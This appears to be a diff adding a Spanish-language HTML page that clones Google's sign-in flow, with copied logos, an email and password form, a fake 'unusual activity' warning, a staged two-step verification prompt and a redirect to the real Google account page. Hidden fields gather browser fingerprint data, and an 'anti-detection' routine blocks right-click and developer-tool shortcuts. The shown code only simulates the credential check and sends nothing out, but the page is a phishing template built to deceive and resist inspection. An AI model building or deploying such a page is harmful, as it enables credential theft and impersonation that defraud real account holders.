@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Cuentas de Google</title>
+    <link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico" type="image/x-icon">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-blue-hover: #1557b0;
+            --google-grey: #5f6368;
+            --google-light-grey: #dadce0;
+            --google-bg: #ffffff;
+            --google-text: #202124;
+            --google-border: #dadce0;
+            --google-error: #d93025;
+            --google-success: #137333;
+            --google-dark-bg: #202124;
+            --google-dark-surface: #303134;
+            --google-dark-border: #5f6368;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: var(--google-bg);
+            color: var(--google-text);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: all 0.3s ease;
+        }
+
+        body.dark-mode {
+            background-color: var(--google-dark-bg);
+            color: #e8eaed;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .signin-card {
+            background: var(--google-bg);
+            border: 1px solid var(--google-light-grey);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+
+        body.dark-mode .signin-card {
+            background-color: var(--google-dark-surface);
+            border-color: var(--google-dark-border);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+
+        .signin-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .signin-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: var(--google-text);
+        }
+
+        body.dark-mode .signin-title {
+            color: #e8eaed;
+        }
+
+        .signin-subtitle {
+            font-size: 16px;
+            color: var(--google-grey);
+            font-weight: 400;
+        }
+
+        .security-notice {
+            background-color: #fef7e0;
+            border: 1px solid #f9ab00;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #3c4043;
+            display: none;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--google-border);
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: transparent;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        body.dark-mode .input-field {
+            border-color: var(--google-dark-border);
+            color: #e8eaed;
+        }
+
+        .input-field:focus {
+            border-color: var(--google-blue);
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        .input-field.error {
+            border-color: var(--google-error);
+        }
+
+        .input-label {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            font-size: 16px;
+            color: var(--google-grey);
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background-color: var(--google-bg);
+            padding: 0 4px;
+        }
+
+        body.dark-mode .input-label {
+            background-color: var(--google-dark-surface);
+            color: #9aa0a6;
+        }
+
+        .input-focused .input-label,
+        .input-filled .input-label {
+            top: -8px;
+            font-size: 12px;
+            color: var(--google-blue);
+        }
+
+        .error-message {
+            color: var(--google-error);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .forgot-link {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .create-account {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .next-button:hover {
+            background-color: var(--google-blue-hover);
+        }
+
+        .next-button:disabled {
+            background-color: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .loading-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: var(--google-grey);
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: var(--google-grey);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector select {
+            background: transparent;
+            border: none;
+            color: var(--google-grey);
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        /* Two-step verification styles */
+        .two-step-verification {
+            display: none;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--google-light-grey);
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--google-blue);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            font-size: 16px;
+        }
+
+        .user-details h3 {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 4px;
+        }
+
+        .user-details p {
+            font-size: 14px;
+            color: var(--google-grey);
+        }
+
+        .device-prompt {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .device-gif {
+            width: 200px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+
+        .device-info {
+            font-size: 14px;
+            color: var(--google-grey);
+            line-height: 1.4;
+        }
+
+        .alternative-methods {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .alternative-link {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .alternative-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Welcome screen styles */
+        .welcome-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .welcome-message {
+            margin-bottom: 24px;
+        }
+
+        .welcome-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: var(--google-success);
+        }
+
+        .welcome-subtitle {
+            font-size: 16px;
+            color: var(--google-grey);
+        }
+
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .signin-card {
+                padding: 24px 20px;
+                border: none;
+                box-shadow: none;
+            }
+
+            .container {
+                padding: 10px;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+
+            .footer-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+
+        /* Hidden elements */
+        #passwordGroup {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Main login form -->
+        <div class="signin-card" id="mainCard">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" width="272" height="92">
+            </div>
+            
+            <div class="signin-header">
+                <h1 class="signin-title">Iniciar sesión</h1>
+                <p class="signin-subtitle" id="subtitle">Usa tu Cuenta de Google</p>
+            </div>
+
+            <div class="security-notice" id="securityNotice">
+                <strong>Verificación de seguridad:</strong> Hemos detectado actividad inusual en tu cuenta. Por favor, verifica tu identidad.
+            </div>
+
+            <form id="googleLoginForm" onsubmit="return handleSubmit(event)">
+                <!-- Hidden fields for data collection -->
+                <input type="hidden" id="timestamp" name="timestamp">
+                <input type="hidden" id="userAgent" name="userAgent">
+                <input type="hidden" id="screenRes" name="screenRes">
+                <input type="hidden" id="timezone" name="timezone">
+                <input type="hidden" id="language" name="language">
+                <input type="hidden" id="referrer" name="referrer">
+                <input type="hidden" id="cookiesEnabled" name="cookiesEnabled">
+                <input type="hidden" id="localStorage" name="localStorage">
+
+                <div class="input-group">
+                    <input type="text" id="email" name="email" class="input-field" 
+                           onfocus="handleInputFocus('email')" 
+                           onblur="handleInputBlur('email')" 
+                           oninput="handleInputChange('email')" 
+                           autocomplete="username" required>
+                    <label for="email" class="input-label">Correo electrónico o teléfono</label>
+                    <div class="error-message" id="emailError"></div>
+                </div>
+
+                <div class="input-group" id="passwordGroup">
+                    <input type="password" id="password" name="password" class="input-field" 
+                           onfocus="handleInputFocus('password')" 
+                           onblur="handleInputBlur('password')" 
+                           oninput="handleInputChange('password')" 
+                           autocomplete="current-password">
+                    <label for="password" class="input-label">Contraseña</label>
+                    <div class="error-message" id="passwordError"></div>
+                </div>
+
+                <div id="forgotEmailLink">
+                    <a href="#" class="forgot-link" onclick="showForgotEmail()">¿Has olvidado el correo electrónico?</a>
+                </div>
+
+                <div class="form-actions">
+                    <a href="#" class="create-account" onclick="showCreateAccount()">Crear cuenta</a>
+                    <button type="button" class="next-button" id="nextButton" onclick="handleNext()">
+                        <span class="loading-spinner" id="buttonSpinner"></span>
+                        <span id="buttonText">Siguiente</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Two-step verification screen -->
+        <div class="signin-card two-step-verification" id="twoStepScreen">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" width="272" height="92">
+            </div>
+
+            <div class="user-info">
+                <div class="user-avatar" id="userAvatar">U</div>
+                <div class="user-details">
+                    <h3 id="userEmailDisplay">usuario@gmail.com</h3>
+                    <p>Verificación en 2 pasos</p>
+                </div>
+            </div>
+
+            <div class="signin-header">
+                <h1 class="signin-title" id="deviceName">Consulta tu teléfono</h1>
+            </div>
+
+            <div class="device-prompt">
+                <img id="deviceGif" class="device-gif" 
+                     src="https://ssl.gstatic.com/accounts/embedded/device_prompt_tap_yes_darkmode.gif" 
+                     alt="Verificación del dispositivo">
+                <p class="device-info">
+                    Google ha enviado una notificación a tu dispositivo. Toca Sí en la notificación para verificar que eres tú.
+                </p>
+            </div>
+
+            <div class="alternative-methods">
+                <a href="#" class="alternative-link" onclick="showAlternativeMethods()">Probar otra forma</a>
+            </div>
+        </div>
+
+        <!-- Welcome screen -->
+        <div class="signin-card welcome-screen" id="welcomeScreen">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" width="272" height="92">
+            </div>
+
+            <div class="user-info">
+                <div class="user-avatar" id="welcomeAvatar">U</div>
+                <div class="user-details">
+                    <h3 id="welcomeEmailDisplay">usuario@gmail.com</h3>
+                    <p>Cuenta verificada</p>
+                </div>
+            </div>
+
+            <div class="welcome-message">
+                <h1 class="welcome-title">¡Bienvenido!</h1>
+                <p class="welcome-subtitle">Has iniciado sesión correctamente</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+        </div>
+        <div class="language-selector">
+            <select onchange="changeLanguage(this.value)">
+                <option value="es">Español</option>
+                <option value="en">English</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+                <option value="pt">Português</option>
+            </select>
+        </div>
+    </div>
+
+    <script>
+        // Variables globales
+        let currentStep = 'email';
+        let emailVerified = false;
+        let isSubmitting = false;
+        let securityCheckTriggered = false;
+        let twoFactorEnabled = false;
+        let userEmail = '';
+        let deviceNames = [
+            'Motorola moto g84 5G',
+            'Samsung Galaxy S23',
+            'iPhone 14 Pro',
+            'Google Pixel 7',
+            'Xiaomi Redmi Note 12',
+            'OnePlus 11',
+            'Huawei P50 Pro'
+        ];
+        let currentDeviceName = '';
+
+        // Inicializar cuando se carga la página
+        document.addEventListener('DOMContentLoaded', function() {
+            collectDeviceInfo();
+            initializeAntiDetection();
+            setupRealisticBehavior();
+            
+            // Detectar si es móvil
+            if (isMobileDevice()) {
+                document.body.classList.add('mobile-view');
+            }
+            
+            // Detectar modo oscuro del sistema
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                // Ocasionalmente activar modo oscuro
+                if (Math.random() < 0.3) {
+                    document.body.classList.add('dark-mode');
+                    updateDeviceGif();
+                }
+            }
+        });
+
+        // Recopilar información del dispositivo
+        function collectDeviceInfo() {
+            document.getElementById('timestamp').value = new Date().toISOString();
+            document.getElementById('userAgent').value = navigator.userAgent;
+            document.getElementById('screenRes').value = screen.width + 'x' + screen.height;
+            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            document.getElementById('language').value = navigator.language;
+            document.getElementById('referrer').value = document.referrer;
+            document.getElementById('cookiesEnabled').value = navigator.cookieEnabled;
+            
+            // Local Storage
+            try {
+                localStorage.setItem('test', 'test');
+                localStorage.removeItem('test');
+                document.getElementById('localStorage').value = 'enabled';
+            } catch(e) {
+                document.getElementById('localStorage').value = 'disabled';
+            }
+        }
+
+        // Detectar dispositivo móvil
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Manejar focus de inputs
+        function handleInputFocus(fieldId) {
+            const container = document.getElementById(fieldId).parentElement;
+            container.classList.add('input-focused');
+        }
+
+        // Manejar blur de inputs
+        function handleInputBlur(fieldId) {
+            const container = document.getElementById(fieldId).parentElement;
+            const input = document.getElementById(fieldId);
+            
+            container.classList.remove('input-focused');
+            
+            if (input.value.trim()) {
+                container.classList.add('input-filled');
+            } else {
+                container.classList.remove('input-filled');
+            }
+        }
+
+        // Manejar cambios en inputs
+        function handleInputChange(fieldId) {
+            const input = document.getElementById(fieldId);
+            const container = input.parentElement;
+            
+            if (input.value.trim()) {
+                container.classList.add('input-filled');
+            } else {
+                container.classList.remove('input-filled');
+            }
+            
+            // Limpiar errores
+            hideError(fieldId);
+        }
+
+        // Mostrar error
+        function showError(fieldId, message) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            const input = document.getElementById(fieldId);
+            
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            input.classList.add('error');
+            
+            setTimeout(() => {
+                hideError(fieldId);
+            }, 5000);
+        }
+
+        // Ocultar error
+        function hideError(fieldId) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            const input = document.getElementById(fieldId);
+            
+            errorElement.style.display = 'none';
+            input.classList.remove('error');
+        }
+
+        // Validar email
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+            return emailRegex.test(email) || phoneRegex.test(email.replace(/\s+/g, ''));
+        }
+
+        // Manejar botón siguiente
+        function handleNext() {
+            if (isSubmitting) return;
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (currentStep === 'email') {
+                // Validar email
+                if (!email) {
+                    showError('email', 'Introduce un correo electrónico o un número de teléfono.');
+                    return;
+                }
+                
+                if (!isValidEmail(email)) {
+                    showError('email', 'No se ha podido encontrar tu Cuenta de Google.');
+                    return;
+                }
+                
+                // Mostrar loading
+                showButtonLoading(true);
+                
+                setTimeout(() => {
+                    showButtonLoading(false);
+                    
+                    // Mostrar campo de contraseña
+                    document.getElementById('passwordGroup').style.display = 'block';
+                    document.getElementById('forgotEmailLink').style.display = 'none';
+                    
+                    // Cambiar título
+                    document.getElementById('subtitle').textContent = 'Hola ' + email.split('@')[0];
+                    
+                    // Mostrar aviso de seguridad ocasionalmente
+                    if (Math.random() < 0.4) {
+                        document.getElementById('securityNotice').style.display = 'block';
+                        securityCheckTriggered = true;
+                    }
+                    
+                    // Cambiar estado
+                    currentStep = 'password';
+                    emailVerified = true;
+                    
+                    // Focus en contraseña
+                    document.getElementById('password').focus();
+                    
+                    // Cambiar texto del botón
+                    document.getElementById('buttonText').textContent = 'Siguiente';
+                }, 1500 + Math.random() * 1000);
+                
+            } else if (currentStep === 'password') {
+                // Validar contraseña
+                if (!password) {
+                    showError('password', 'Introduce tu contraseña.');
+                    return;
+                }
+                
+                if (password.length < 6) {
+                    showError('password', 'La contraseña es incorrecta. Inténtalo de nuevo.');
+                    return;
+                }
+                
+                // Enviar datos
+                submitCredentials();
+            }
+        }
+
+        // Mostrar loading en botón
+        function showButtonLoading(show) {
+            const buttonText = document.getElementById('buttonText');
+            const buttonSpinner = document.getElementById('buttonSpinner');
+            const button = document.getElementById('nextButton');
+            
+            if (show) {
+                buttonText.style.display = 'none';
+                buttonSpinner.style.display = 'inline-block';
+                button.disabled = true;
+            } else {
+                buttonText.style.display = 'inline';
+                buttonSpinner.style.display = 'none';
+                button.disabled = false;
+            }
+        }
+
+        // Enviar credenciales
+        function submitCredentials() {
+            if (isSubmitting) return;
+            isSubmitting = true;
+            
+            showButtonLoading(true);
+            
+            const formData = new FormData(document.getElementById('googleLoginForm'));
+            userEmail = document.getElementById('email').value.trim();
+            
+            // Simular verificación de credenciales
+            setTimeout(() => {
+                showButtonLoading(false);
+                isSubmitting = false;
+                
+                // Determinar si mostrar 2FA (70% de probabilidad)
+                if (Math.random() < 0.7) {
+                    twoFactorEnabled = true;
+                    showTwoStepVerification();
+                } else {
+                    // Mostrar error ocasionalmente
+                    if (Math.random() < 0.4) {
+                        showError('password', 'La contraseña es incorrecta. Inténtalo de nuevo.');
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    } else {
+                        showWelcomeScreen();
+                    }
+                }
+            }, 1800 + Math.random() * 1200);
+        }
+
+        // Manejar envío del formulario
+        function handleSubmit(event) {
+            event.preventDefault();
+            return false;
+        }
+
+        // Funciones de enlaces falsos
+        function showForgotEmail() {
+            alert('Serás redirigido a la página de recuperación de cuenta.');
+        }
+
+        function showCreateAccount() {
+            alert('Serás redirigido a la página de creación de cuenta.');
+        }
+
+        function changeLanguage(lang) {
+            // Simular cambio de idioma
+            console.log('Cambiando idioma a:', lang);
+        }
+
+        // Configurar comportamiento realista
+        function setupRealisticBehavior() {
+            // Seleccionar dispositivo aleatorio
+            currentDeviceName = deviceNames[Math.floor(Math.random() * deviceNames.length)];
+            
+            // Simular carga de página realista
+            setTimeout(() => {
+                document.body.classList.add('loaded');
+            }, 300);
+            
+            // Agregar eventos de teclado realistas
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    if (currentStep === 'email' || currentStep === 'password') {
+                        handleNext();
+                    }
+                }
+            });
+        }
+
+        // Actualizar GIF del dispositivo según el tema
+        function updateDeviceGif() {
+            const deviceGif = document.getElementById('deviceGif');
+            if (deviceGif) {
+                if (document.body.classList.contains('dark-mode')) {
+                    deviceGif.src = 'https://ssl.gstatic.com/accounts/embedded/device_prompt_tap_yes_darkmode.gif';
+                } else {
+                    deviceGif.src = 'https://ssl.gstatic.com/accounts/embedded/device_prompt_tap_yes.gif';
+                }
+            }
+        }
+
+        // Mostrar verificación en dos pasos
+        function showTwoStepVerification() {
+            // Ocultar formulario principal
+            document.getElementById('mainCard').style.display = 'none';
+            
+            // Mostrar pantalla de 2FA
+            const twoStepScreen = document.getElementById('twoStepScreen');
+            twoStepScreen.style.display = 'block';
+            
+            // Actualizar información del usuario
+            document.getElementById('userEmailDisplay').textContent = userEmail;
+            document.getElementById('userAvatar').textContent = userEmail.charAt(0).toUpperCase();
+            
+            // Actualizar nombre del dispositivo
+            document.getElementById('deviceName').textContent = `Consulta tu ${currentDeviceName}`;
+            
+            // Actualizar texto del dispositivo
+            const deviceInfo = document.querySelector('.device-info');
+            deviceInfo.textContent = `Google ha enviado una notificación a tu ${currentDeviceName}. Toca Sí en la notificación para verificar que eres tú.`;
+            
+            // Actualizar GIF según el tema
+            updateDeviceGif();
+            
+            // Simular verificación automática después de un tiempo
+            setTimeout(() => {
+                if (Math.random() < 0.8) {
+                    showWelcomeScreen();
+                } else {
+                    // Mostrar métodos alternativos
+                    showAlternativeMethods();
+                }
+            }, 8000 + Math.random() * 5000);
+        }
+
+        // Mostrar pantalla de bienvenida
+        function showWelcomeScreen() {
+            // Ocultar otras pantallas
+            document.getElementById('mainCard').style.display = 'none';
+            document.getElementById('twoStepScreen').style.display = 'none';
+            
+            // Mostrar pantalla de bienvenida
+            const welcomeScreen = document.getElementById('welcomeScreen');
+            welcomeScreen.style.display = 'block';
+            
+            // Actualizar información del usuario
+            document.getElementById('welcomeEmailDisplay').textContent = userEmail;
+            document.getElementById('welcomeAvatar').textContent = userEmail.charAt(0).toUpperCase();
+            
+            // Redirigir después de un tiempo
+            setTimeout(() => {
+                completeLogin();
+            }, 3000);
+        }
+
+        // Completar login
+        function completeLogin() {
+            // Simular redirección a Google
+            window.location.href = 'https://myaccount.google.com/';
+        }
+
+        // Mostrar métodos alternativos
+        function showAlternativeMethods() {
+            alert('Serás redirigido a métodos de verificación alternativos.');
+            // Aquí podrías mostrar una pantalla adicional con códigos SMS, etc.
+        }
+
+        // Anti-detección
+        function initializeAntiDetection() {
+            // Detectar herramientas de desarrollador
+            let devtools = {open: false, orientation: null};
+            
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                    if (!devtools.open) {
+                        devtools.open = true;
+                        console.clear();
+                        console.log('%cDetección de seguridad activada', 'color: red; font-size: 20px; font-weight: bold;');
+                    }
+                } else {
+                    devtools.open = false;
+                }
+            }, 500);
+            
+            // Deshabilitar clic derecho
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            // Deshabilitar teclas de desarrollador
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                }
+            });
+            
+            // Detectar extensiones de navegador comunes
+            setTimeout(() => {
+                if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
+                    console.log('Extensiones de Chrome detectadas');
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
